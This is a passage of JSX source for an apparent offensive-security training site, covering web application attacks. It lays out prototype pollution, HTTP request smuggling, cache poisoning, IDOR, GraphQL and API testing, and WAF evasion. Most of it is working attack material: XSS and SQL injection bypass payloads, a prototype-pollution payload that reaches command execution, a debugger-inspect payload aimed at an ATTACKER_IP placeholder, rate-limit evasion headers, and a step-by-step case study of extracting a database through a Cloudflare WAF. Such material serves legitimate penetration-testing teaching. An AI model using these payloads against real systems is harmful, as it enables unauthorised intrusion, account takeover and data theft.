        <Pre label="// PROTOTYPE POLLUTION - CLIENT AND SERVER SIDE">{`# JavaScript prototype chain: all objects inherit from Object.prototype
# Polluting Object.prototype affects ALL objects in runtime

# Client-side (browser) detection:
# Find endpoints that merge user-controlled objects recursively
# Vulnerable merge: Object.assign(target, userInput)  <- shallow, OK
# Vulnerable deep merge: deepMerge(target, userInput)  <- dangerous

# Test payload in query string or JSON body:
# ?__proto__[polluted]=yes   -> check if {}.polluted === 'yes' in console
# ?constructor[prototype][polluted]=yes
# JSON: {"__proto__": {"polluted": "yes"}}

# Client-side exploitation:
# Pollute innerHTML property to trigger XSS:
# {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}

# SERVER-SIDE (Node.js) prototype pollution to RCE:
# Libraries vulnerable to server-side PP: lodash.merge (< 4.17.5), jQuery.extend, jquery-deparam
# Pollute shell options:
# {"__proto__": {"shell": "node", "env": {"NODE_OPTIONS": "--inspect=ATTACKER_IP:9229"}}}
# Exploit child_process.exec options via polluted prototype

# Express + PP RCE via child_process:
# {"__proto__": {"outputFunctionName": "_x;global.process.mainModule.require('child_process').exec('id');x"}}
# This poisons Pug template renderer options in certain Express configurations

# Detection tool: Server-Side Prototype Pollution Scanner (Burp extension)`}</Pre>
        <H3>HTTP Request Smuggling</H3>
        <Pre label="// HTTP REQUEST SMUGGLING / DESYNC">{`# HTTP/1.1 has two ways to specify body length:
# Content-Length (CL): exact byte count
# Transfer-Encoding (TE): chunked transfer, ends at 0-length chunk

# CL.TE smuggling (front-end uses CL, back-end uses TE):
POST / HTTP/1.1
Host: TARGET_URL
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED_PREFIX

# TE.CL smuggling (front-end uses TE, back-end uses CL):
POST / HTTP/1.1
Host: TARGET_URL
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


# TE.TE obfuscation (both use TE but one ignores the obfuscated header):
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:  chunked

# Time-delay detection test (CL.TE):
POST / HTTP/1.1
Host: TARGET_URL
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
A
X

# If response takes 10+ seconds -> back-end waiting for TE body = CL.TE confirmed

# Tools:
git clone https://github.com/defparam/smuggler
python3 smuggler.py -u https://TARGET_URL -t 10
# Burp extension: HTTP Request Smuggler (James Kettle / PortSwigger)`}</Pre>
        <H3>Web Cache Poisoning</H3>
        <Pre label="// WEB CACHE POISONING">{`# Cache key = what the cache uses to identify unique responses
# Typically: URL + Host header (sometimes query params)
# Unkeyed inputs = headers that change the RESPONSE but are NOT in cache key

# Step 1: Identify unkeyed inputs (Param Miner Burp extension does this)
# Test: add X-Forwarded-Host: test.com -> if response changes -> unkeyed

# Common unkeyed headers:
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Host
X-Forwarded-Port

# Step 2: Find reflection in response
# X-Forwarded-Host: evil.com
# Response body: <link href="http://evil.com/assets/style.css">
# -> URL is built from X-Forwarded-Host -> injection point

# Step 3: Inject XSS payload via unkeyed header
# X-Forwarded-Host: evil.com"><script>alert(1)</script>
# Cache key: GET / HTTP/1.1 Host: target.com (no X-Forwarded-Host)
# -> Poisoned response cached for all users visiting /

# Cache buster (force new cache entry for testing):
GET /?cb=RANDOM_STRING HTTP/1.1

# Cache deception attack (opposite direction):
# Trick cache into storing a PRIVATE page as public
# TARGET_URL/api/private/user-data/nonexistent.css
# Cache sees .css extension -> caches as static
# Cache serves victim's private data to anyone requesting that URL

# Web Cache Vulnerability Scanner:
go install github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
wcvs -u https://TARGET_URL`}</Pre>
        <H3>Mass Assignment and IDOR</H3>
        <Pre label="// MASS ASSIGNMENT AND IDOR">{`# MASS ASSIGNMENT: ORM/framework binds all request fields to model
# Vulnerable: User.update(request.params)  <- assigns ALL params including admin:true
# Test: add extra fields to requests:
# POST /api/user/update
# {"name": "test", "role": "admin", "is_admin": true, "plan": "enterprise"}
# Look for any that change user state in profile/dashboard

# IDOR (Insecure Direct Object Reference) testing:
# 1. Create account A and account B
# 2. Note all IDs referenced by account A
# 3. Authenticate as account B
# 4. Access account A resources using account A IDs

# IDOR in numeric IDs:
# GET /api/orders/1234
# Try: /api/orders/1233, /api/orders/1235, /api/orders/1

# IDOR in GUIDs - harder but possible:
# GUIDs appear in responses even when not in the URL
# GET /api/invoices -> response contains {"invoice_id": "uuid-here", "user_id": "uuid-here"}
# Collect UUIDs from all endpoints -> cross-reference with other endpoints
# Some UUIDs are predictable (UUID v1 = timestamp-based)

# Vertical IDOR (privilege escalation):
# GET /api/admin/users  (admin endpoint)
# Try as regular user -> should return 403
# If returns 200 = broken access control

# Autorize Burp extension automates horizontal IDOR testing:
# Set low-priv cookie in Autorize -> all requests replayed with low-priv
# Green = 403 returned, Red = 200 returned (access granted) = IDOR found`}</Pre>
        <Note type="tip">HTTP/2 downgrades enable new smuggling variants. When the front-end uses HTTP/2 and back-end uses HTTP/1, the H2 headers are translated into HTTP/1 headers. Injecting CL or TE into HTTP/2 pseudo-headers can poison the HTTP/1 request sent to the back-end. Burp Suite Pro supports H2 smuggling research natively.</Note>
      </div>
    ),
  },
  {
    id: 'wa-09',
    title: 'API Security Testing',
    difficulty: 'ADVANCED',
    readTime: '14 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'BOLA (Broken Object Level Authorization) is the most common and most impactful API vulnerability class',
      'GraphQL introspection reveals the entire schema - attackers can map all queries, mutations, and types',
      'API keys in JavaScript bundles, git history, and URL parameters are trivially exposed and commonly found',
      'kiterunner discovers unknown API endpoints by replaying real-world API wordlists - finds what ffuf misses',
      'Excessive data exposure returns more fields than the UI shows - always check raw API response vs UI rendering',
    ],
    content: (
      <div>
        <P>API security is the fastest growing segment of web application testing. Modern applications are API-first - mobile apps, SPAs, and microservices all communicate via APIs that expose data and functionality directly. The OWASP API Security Top 10 defines the unique risk landscape.</P>
        <H3>REST API Testing Methodology</H3>
        <Pre label="// REST API COMPLETE TESTING WORKFLOW">{`# Step 1: Endpoint discovery
# From JS files (most reliable):
gau TARGET_URL | grep "api" | sort -u
# Extract from JS bundles:
curl https://TARGET_URL/main.bundle.js | grep -oP '"/api/[^"]*"' | sort -u

# kiterunner - API-aware endpoint discovery:
git clone https://github.com/assetnote/kiterunner
kr scan https://TARGET_URL -w routes-large.kite -o endpoints.txt

# ffuf for API paths:
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -u https://TARGET_URL/api/FUZZ

# OpenAPI / Swagger spec discovery:
# /swagger.json
# /swagger/v1/swagger.json
# /api-docs
# /openapi.json
# /v1/api-docs
# If found: import into Burp (Extensions > OpenAPI Parser) -> auto-generates all requests

# Step 2: HTTP verb tampering
# GET /api/users/GUID_HERE         -> read (probably allowed)
# DELETE /api/users/GUID_HERE      -> delete another user?
# PUT /api/users/GUID_HERE         -> update another user?
# PATCH /api/users/GUID_HERE       -> partial update?

# Step 3: API versioning attacks
# /api/v1/users/1 (current, protected)
# /api/v2/users/1 (try newer version)
# /api/v0/users/1 (old version, less secure)
# /api/users/1    (no version prefix)
# /v1/api/users/1 (different order)

# Step 4: BOLA testing (Broken Object Level Authorization)
# Same as IDOR but for API objects
# Swap object IDs between user A and user B sessions
# Test all endpoints that reference object IDs`}</Pre>
        <H3>GraphQL Security Testing</H3>
        <Pre label="// GRAPHQL - COMPLETE ATTACK SURFACE">{`# Identify GraphQL endpoints:
# /graphql, /api/graphql, /graphql/v1, /query, /gql

# Introspection query - maps entire schema:
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name kind } }
        args { name type { name } }
      }
    }
  }
}

# If introspection disabled, check field suggestions:
{ user { doesNotExist } }
# Error: "Cannot query field 'doesNotExist'. Did you mean 'password', 'email', 'ssn'?"

# Find all queries and mutations:
{ __schema { queryType { fields { name description args { name type { name } } } } } }
{ __schema { mutationType { fields { name description } } } }

# Batching attack - send 1000 mutations in one request (rate limit bypass):
[
  {"query": "mutation { login(user: \"admin\", pass: \"pass1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"pass2\") { token } }"},
  ...
]

# Query depth attack (DoS):
{ user { friends { friends { friends { friends { id name email } } } } } }

# IDOR in GraphQL:
{ user(id: "OTHER_USER_ID_HERE") { email password ssn } }
{ order(id: "OTHER_ORDER_ID") { total items } }

# GraphQL injection (SQLi/NoSQLi through GraphQL):
{ user(id: "1 OR 1=1") { email } }
{ product(name: "{\\"$gt\\": \\"\\"}") { price } }

# Tools:
# InQL (Burp extension): introspection scanner, query generator
# GraphQL Voyager: visual schema explorer (paste introspection result)
# graphql-cop: automated security scanner
pip3 install graphql-cop
graphql-cop -t https://TARGET_URL/graphql`}</Pre>
        <H3>API Key Exposure</H3>
        <Pre label="// FINDING EXPOSED API KEYS">{`# JavaScript bundle analysis:
# Download main JS bundles from target
curl https://TARGET_URL/static/js/main.chunk.js -o main.js
grep -E "(api_key|apikey|api-key|secret|password|token|bearer|auth)" main.js -i

# Git history (if .git directory exposed):
# Check: TARGET_URL/.git/
git clone TARGET_URL/.git/ --no-checkout recovered/
cd recovered && git log --all --oneline
git show COMMIT_HASH:config.py    # find credentials in old commits

# GitHub / public repos (GitLeaks):
gitleaks detect --source=.      # scan local repo
gitleaks detect --source=https://github.com/TARGET_ORG/REPO

# Wayback Machine for old API keys:
waybackurls TARGET_URL | grep -E "(api_key=|token=|secret=)"

# Common API key locations in requests:
# Authorization: Bearer TOKEN_HERE
# Authorization: Api-Key KEY_HERE
# X-API-Key: KEY_HERE
# ?api_key=KEY_HERE      (worst - logged in proxy/server logs)
# Cookie: auth=KEY_HERE

# API rate limiting bypass techniques:
# Rotate JWT tokens between requests
# Vary X-Forwarded-For header per request
# Use slightly different endpoint paths (/api/v1/users vs /api/v1//users)
# Some APIs rate-limit by IP - use multiple IPs via proxy`}</Pre>
        <H3>gRPC Security Testing</H3>
        <Pre label="// gRPC TESTING WORKFLOW">{`# gRPC uses Protocol Buffers (binary encoding) over HTTP/2
# Must decode .proto files to understand message structure

# Find .proto files:
# - In Android APK: unzip app.apk, look in assets/ or res/
# - In iOS IPA: similar structure
# - In Docker images: docker export -> grep for .proto
# - In GitHub repos of the target organisation

# grpcurl - command line gRPC client:
# List all services:
grpcurl -plaintext TARGET_HOST:PORT list
# List methods of a service:
grpcurl -plaintext TARGET_HOST:PORT describe SERVICE_NAME
# Call a method:
grpcurl -plaintext -d '{"user_id": "1"}' TARGET_HOST:PORT SERVICE_NAME/MethodName

# grpcui - web UI for gRPC testing:
grpcui -plaintext TARGET_HOST:PORT

# Test for:
# - Missing auth on sensitive methods (no metadata token required)
# - IDOR: send other users' IDs
# - Injection: try SQL/NoSQL payloads in string fields
# - Enumeration: increment integer IDs
# - Missing TLS: plaintext gRPC in production (-plaintext flag = no TLS)`}</Pre>
        <H3>OWASP API Security Top 10</H3>
        <Table
          headers={['API Risk', 'Category', 'Test Method']}
          rows={[
            ['API1', 'BOLA - Broken Object Level Auth', 'Swap object IDs between user A and B sessions'],
            ['API2', 'Broken Authentication', 'JWT attacks, weak keys, missing expiry'],
            ['API3', 'Broken Object Property Level Auth', 'Read/write fields user should not access in object'],
            ['API4', 'Unrestricted Resource Consumption', 'Send large payloads, batch requests, no rate limiting'],
            ['API5', 'BFLA - Broken Function Level Auth', 'Access admin endpoints as regular user'],
            ['API6', 'Unrestricted Access to Sensitive Flows', 'Exploit flows without rate limits: OTP, reset, verify'],
            ['API7', 'Server Side Request Forgery', 'Inject URLs into any API parameter accepting URLs'],
            ['API8', 'Security Misconfiguration', 'Debug mode, CORS wildcard, verbose errors, old TLS'],
            ['API9', 'Improper Inventory Management', 'v0/legacy endpoints with less security than current'],
            ['API10', 'Unsafe Consumption of APIs', 'Attack third-party APIs the target trusts/consumes'],
          ]}
        />
        <Note type="tip">Excessive data exposure is trivially testable: make an API call and compare the raw JSON response to what the UI actually displays. If the response contains fields like password_hash, ssn, full_card_number, or internal_notes that never appear in the UI, the API is exposing too much data to any client that bypasses the front-end.</Note>
      </div>
    ),
  },
  {
    id: 'wa-10',
    title: 'WAF Bypass and Advanced Evasion',
    difficulty: 'ADVANCED',
    readTime: '12 min',
    labLink: '/modules/web-attacks/lab',
    takeaways: [
      'wafw00f fingerprints WAFs from response signatures - always identify the WAF before attempting bypass',
      'Cloudflare origin IP discovery via historical DNS, Shodan, or censys lets you bypass the WAF entirely',
      'HTTP parameter pollution sends the same parameter twice - different frameworks use first, last, or both values',
      'ModSecurity CRS paranoia level 1 blocks the obvious; level 4 blocks nearly everything including benign traffic',
      'WAF bypass is rarely about a single trick - combine encoding, case variation, and syntax alternatives in layers',
    ],
    content: (
      <div>
        <P>Web Application Firewalls are the primary defence layer many organisations rely on to block injection attacks. Understanding WAF behaviour is essential for both offensive testing (to get through) and defensive implementation (to configure correctly). A bypassed WAF gives false confidence - real attackers know these techniques.</P>
        <H3>WAF Identification</H3>
        <Pre label="// WAF FINGERPRINTING">{`# wafw00f - dedicated WAF fingerprinting tool:
pip3 install wafw00f
wafw00f https://TARGET_URL
wafw00f -a https://TARGET_URL  # test all WAF signatures

# Manual fingerprinting:
# Send a known attack payload and observe the block response
# Different WAFs have distinctive block pages:
# Cloudflare:  "Attention Required! | Cloudflare" + CF-Ray header
# AWS WAF:     403 response, "Request blocked" (generic)
# Akamai:      "Access Denied" + Reference header
# Imperva:     "The request was rejected" + Incapsula cookie
# ModSecurity: "Not Acceptable" or "Forbidden" with mod_security headers
# F5 BigIP:    Response with TS* cookie values, specific error format

# Header analysis for WAF presence:
curl -I -X DELETE https://TARGET_URL/ 2>/dev/null | grep -i "x-cdn\|cf-ray\|x-sucuri\|x-check-cacheable\|server"`}</Pre>
        <H3>SQLi WAF Bypass Techniques</H3>
        <Pre label="// SQL INJECTION WAF BYPASS">{`# Comment insertion to break signature matching:
# Normal: UNION SELECT
# Bypass: UNION/**/SELECT  or  UN/**/ION/**/SE/**/LECT

# MySQL version comment (executes in MySQL only):
# Normal: UNION SELECT
# Bypass: /*!UNION*/ /*!SELECT*/  or  /*!50000UNION SELECT*/

# Case randomisation:
uNiOn sElEcT 1,2,3--

# Whitespace alternatives (when space is filtered):
UNION%09SELECT   # tab
UNION%0bSELECT   # vertical tab
UNION%0cSELECT   # form feed
UNION%0dSELECT   # carriage return
UNION%a0SELECT   # non-breaking space

# Alternative syntax (MySQL specific):
# Instead of: OR 1=1
# Use: OR true  or  OR 2-1  or  OR 0x01=0x01

# URL double encoding:
# %27 = ' (URL encoded)
# %2527 = %27 = ' (double encoded - server decodes once, WAF saw %2527)

# JSON/XML encoding bypass:
# Some WAFs don't parse JSON bodies:
# {"query": "select * from users where id=1 union select 1,2,3--"}
# Put SQL inside JSON key names or values in unusual positions

# Bypass Cloudflare SQLi WAF with chunked transfer:
# Send request body in chunks - some WAFs only inspect first chunk
# Transfer-Encoding: chunked
# 5\r\n
# 1 uni\r\n
# 9\r\n
# on select\r\n`}</Pre>
        <H3>XSS WAF Bypass</H3>
        <Pre label="// XSS WAF BYPASS TECHNIQUES">{`# When script tag is blocked:
<img src=x onerror=alert(1)>       # no script tag
<svg onload=alert(1)>              # SVG element
<body onload=alert(1)>             # body event
<input autofocus onfocus=alert(1)> # focus event

# When event handlers are blocked:
<a href=javascript:alert(1)>click</a>  # javascript: URI
<object data=javascript:alert(1)>      # object data URI

# When parentheses are blocked:
<script>alert&#96;1&#96;</script>      # template literal call
<script>onerror=alert;throw 1</script>   # throw as arg

# When = is blocked:
<img src onerror alert(1)>    # no equals in event handler

# Encoding layers:
# HTML entities inside attributes:
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
# URL encoding in href:
<a href=javascript:%61%6c%65%72%74%28%31%29>click</a>
# Base64 in eval:
<svg onload=eval(atob('YWxlcnQoMSk='))>

# DOM clobbering to bypass filters:
<form id=x><input id=y name=action value=alert(1)>
# Access via: document.getElementById('x').action

# XSStrike for automated bypass:
python3 xsstrike.py -u "https://TARGET_URL/?param=PAYLOAD_HERE" --blind --fuzzer`}</Pre>
        <H3>Cloudflare Origin IP Discovery</H3>
        <Pre label="// BYPASSING CLOUDFLARE BY FINDING ORIGIN">{`# If you can hit the origin IP directly, Cloudflare is bypassed entirely
# Origin server has no WAF - only Cloudflare edge does

# Method 1: Historical DNS records
# Cloudflare was added at some point - old A records reveal origin IP
# Tools: SecurityTrails, ViewDNS.info, DNSHistory, passivetotal

# Method 2: Shodan / Censys - search for SSL cert on other IPs
# Shodan: ssl:"target.com" -> finds IPs serving target's TLS cert directly
# Censys: parsed.names: target.com -> same
shodan search "ssl:target.com" --fields ip_str,port
# Then: curl --resolve "target.com:443:ORIGIN_IP_HERE" https://target.com/

# Method 3: Direct IP subdomains
# ftp.target.com, mail.target.com, direct.target.com
# Email headers from target (send email to them, read full headers)
# SMTP MX records often point to origin or same hosting

# Method 4: SPF records reveal mail server IPs
# mail.target.com usually not Cloudflare-proxied
# dig MX target.com  ->  get mail server hostname  ->  resolve IP

# Method 5: Timing-based origin discovery
# Measure ping times to Cloudflare edge (fast, anycast)
# Find IPs with same response time as edge = likely same datacenter as origin`}</Pre>
        <H3>HTTP Parameter Pollution and Rate Limit Bypass</H3>
        <Pre label="// HTTP PARAMETER POLLUTION AND RATE LIMITING">{`# HTTP Parameter Pollution (HPP):
# Send the same parameter twice - different frameworks handle it differently:
# PHP: last value wins  -> ?page=1&page=2 -> page=2
# ASP.NET: both joined with comma -> page=1,2
# Express.js: array -> page=['1','2']
# Flask: first value wins -> page=1

# WAF bypass via HPP:
# WAF may check only first occurrence:
# ?id=1&id=1 UNION SELECT 1,2,3--
# WAF sees id=1 (safe), app uses id=1 UNION SELECT (malicious)
# Or: &id=1 UNION SELECT 1,2,3--&id=1 (WAF sees second, app uses first+second)

# Rate limit bypass via header injection:
X-Forwarded-For: RANDOM_IP_HERE    # rotate per request
X-Real-IP: RANDOM_IP_HERE
X-Originating-IP: RANDOM_IP_HERE
Cluster-Client-IP: RANDOM_IP_HERE
True-Client-IP: RANDOM_IP_HERE
# Burp Intruder: add rotating IP as header with Number payload type

# ModSecurity paranoia levels:
# PL1 (default): blocks obvious attacks - SQLi, XSS with minimal false positives
# PL2: adds additional rules, more false positives
# PL3: strict, many false positives in real applications
# PL4: extremely strict, nearly everything blocked

# ModSecurity CRS bypass (PL1):
# Rules are regex-based
# spaces -> %0a (newline) to break regex word boundaries
# Union -> /*!UNION*/ MySQL comment bypass
# script -> <sCrIpT> case variation

# Paranoia testing - determine WAF block threshold:
# Send payloads incrementally: first safe, then mildly anomalous
# Note at what point blocks begin -> WAF sensitivity mapped`}</Pre>
        <H3>Real-World WAF Bypass Case Study</H3>
        <Pre label="// CASE STUDY: SQLI THROUGH CLOUDFLARE WAF">{`# Target: E-commerce site with Cloudflare WAF
# Vulnerability: SQLi in search parameter

# Step 1: Identify WAF
wafw00f https://TARGET_URL
# Output: Cloudflare

# Step 2: Baseline - what gets blocked?
# Test: TARGET_URL/search?q=1' AND 1=1-- -> Blocked (1020)
# Test: TARGET_URL/search?q=1' AND '1'='1 -> Blocked

# Step 3: Try comment bypass
# Test: TARGET_URL/search?q=1' AND/**/1=1-- -> Blocked

# Step 4: Try MySQL version comment
# Test: TARGET_URL/search?q=1' /*!AND*/ 1=1-- -> Passes WAF!
# Cloudflare doesn't parse MySQL-specific comment syntax

# Step 5: Column count enumeration through WAF
# TARGET_URL/search?q=1' /*!ORDER BY*/ 1-- -> Passes
# TARGET_URL/search?q=1' /*!ORDER BY*/ 5-- -> Error (4 columns)

# Step 6: UNION extraction through WAF
# TARGET_URL/search?q=1' /*!UNION*/ /*!SELECT*/ 1,2,3,4--

# Step 7: Database extraction
# TARGET_URL/search?q=1' /*!UNION*/ /*!SELECT*/ database(),2,3,4--

# Step 8: SQLMap with tamper scripts
sqlmap -u "https://TARGET_URL/search?q=1" --tamper=space2comment,between,randomcase --level=5 --risk=2`}</Pre>
        <Note type="info">WAF bypass research is dual-use: the same techniques used to test and bypass WAFs are used by defenders to write better WAF rules. Understanding bypass techniques is required knowledge for anyone writing ModSecurity CRS custom rules or tuning Cloudflare WAF policies. Both red and blue teams need this knowledge.</Note>
      </div>
    ),
  },
]

export default function WebAttacksModule() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: mono, fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <span style={{ color: '#5a7a5a' }}>MODULES</span>
        <span>›</span>
        <span style={{ color: accent }}>MOD-06 // WEB APPLICATION ATTACKS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(0,212,255,0.08)', border: '1px solid rgba(0,212,255,0.3)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em' }}>CONCEPT</span>
          <Link href="/modules/web-attacks/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(0,212,255,0.1)', border: '1px solid rgba(0,212,255,0.5)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: mono, fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>ADVANCED MODULE · CONCEPT PAGE · 10 CHAPTERS</div>
        <h1 style={{ fontFamily: mono, fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: '0 0 20px rgba(0,212,255,0.35)' }}>WEB APPLICATION ATTACKS</h1>
        <p style={{ color: '#5a7a5a', fontFamily: mono, fontSize: '0.75rem', lineHeight: 1.6 }}>OWASP Top 10 · Burp Suite mastery · SQLi · XSS · SSRF · XXE · JWT · OAuth · Deserialization · WAF bypass</p>
      </div>

      <ModuleCodex
        moduleId="web-attacks"
        accent={accent}
        chapters={chapters}
      />

      <div style={{ marginTop: '3rem', paddingTop: '1.5rem', borderTop: '1px solid #0a1a22', display: 'flex', justifyContent: 'space-between' }}>
        <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.72rem', color: '#3a6a3a' }}>&#8592; MOD-05: ACTIVE DIRECTORY</Link>
        <Link href="/modules/malware" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.72rem', color: '#3a6a3a' }}>MOD-07: MALWARE &#8594;</Link>
      </div>
    </div>
  )
}
